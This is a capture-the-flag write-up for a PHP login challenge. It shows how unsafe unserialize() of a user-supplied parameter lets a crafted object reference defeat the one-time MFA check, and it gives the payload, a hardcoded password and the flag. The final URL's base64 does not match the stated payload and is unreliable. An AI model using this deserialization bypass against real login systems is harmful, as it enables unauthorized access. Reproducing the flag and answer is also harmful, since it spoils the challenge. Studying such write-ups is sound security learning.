# Corporate MFA

The source for this corporate zero-trust multi factor login portal has been leaked! Figure out how to defeat the super-secure one time code.

Service: http://corpmfa-01.play.midnightsunctf.se 

Download: corpmfa.tar.gz

## Challenge

The service is a login page which requires a username, password, and MFA token.

We are given the php source code for the challenge.

### Credential verification source code

```php
<?php

final class User
{
	private $userData;

	public function __construct($loginAttempt)
	{
		$this->userData = unserialize($loginAttempt);
		if (!$this->userData)
			throw new InvalidArgumentException('Unable to reconstruct user data');
	}

	private function verifyUsername()
	{
		return $this->userData->username === 'D0loresH4ze';
	}

	private function verifyPassword()
	{
		return password_verify($this->userData->password, '$2y$07$BCryptRequires22Chrcte/VlQH0piJtjXl.0t1XkA8pw9dMXTpOq');
	}

	private function verifyMFA()
	{
		$this->userData->_correctValue = random_int(1e10, 1e11 - 1);
		return (int)$this->userData->mfa === $this->userData->_correctValue;
	}
	
	public function verify()
	{
		if (!$this->verifyUsername())
			throw new InvalidArgumentException('Invalid username');

		if (!$this->verifyPassword())
			throw new InvalidArgumentException('Invalid password');

		if (!$this->verifyMFA())
			throw new InvalidArgumentException('Invalid MFA token value');

		return true;
	}

}
```

As we can see, the username and password are hardcoded.
The password is hashed using built-in php functions.
The MFA token is a randomly generated integer for each login.

## Solution

### Username

The username is given in the source code:

```php
	private function verifyUsername()
	{
		return $this->userData->username === 'D0loresH4ze';
	}
```

### Password

The password for the given hash can be found online from the php official documentation:

```php
	private function verifyPassword()
	{
		return password_verify($this->userData->password, '$2y$07$BCryptRequires22Chrcte/VlQH0piJtjXl.0t1XkA8pw9dMXTpOq');
	}
```

![PHP verifyPassword() Docs](./resources/function.password-verify.png?raw=true)

Password: `rasmuslerdorf`

### MFA token

It is impractical to guess the value of the MFA token.
However, there is an unsafe deserialization of user input on each login attempt:

```php
	public function __construct($loginAttempt)
	{
		$this->userData = unserialize($loginAttempt);
		if (!$this->userData)
			throw new InvalidArgumentException('Unable to reconstruct user data');
	}
```

We can specify our own `unserialize` input as a GET parameter:

```
if (!empty($_GET) && isset($_GET['userdata']))
{
	// prepare notification data structure
	$notification = new stdClass();

	// check credentials & MFA
	try
	{
		$user = new User(base64_decode($_GET['userdata']));
		if ($user->verify())
		{
			$notification->type = 'success';
			$notification->text = 'Congratulations, your flag is: ' . file_get_contents('/flag.txt');
		}
        ...
```

By crafting our own input for `unserialize`, we can make the `mfa` variable a reference to `_correctValue`, so that `(int)$this->userData->mfa === $this->userData->_correctValue` always returns true.

To do so, we modify the serialized payload to include an additional field `_correctValue`, formatted as a number `N`.
We can now reference this value when setting `mfa` using the `R` format and pointing it at position 2, where the `N` format from earlier was placed.
Now, `mfa` will reference the value of `_correctValue`.

## Payload

```
# plaintext
O:8:"stdClass":4:{s:13:"_correctValue";N;s:8:"username";s:11:"D0loresH4ze";s:8:"password";s:13:"rasmuslerdorf";s:3:"mfa";R:2;}

# base64
Tzo4OiJzdGRDbGFzcyI6NDp7czoxMzoiX2NvcnJlY3RWYWx1ZSI7TjtzOjg6InVzZXJuYW1lIjtzOjExOiJEMGxvcmVzSDR6ZSI7czo4OiJwYXNzd29yZCI7czoxMzoicmFzbXVzbGVyZG9yZiI7czozOiJtZmEiO1I6Mjt9

# url
https://corpmfa-01.play.midnightsunctf.se/?userdata=Tzo4OiJzdGRDbGFzcyI6Mzp7czo4OiJ1c2VybmFtZSI7czoxMToiRDBsb3Jlc0g0emUiO3M6ODoicGFzc3dvcmQiO3M6MTM6InJhc211c2xlcmRvcmYiO3M6MzoibWZhIjtzOjEwOiIxMjM0NTY3ODkwIjt9
```

## Flag

`midnight{395E160F-4DB8-4D7A-99EF-08E6799741B5}`

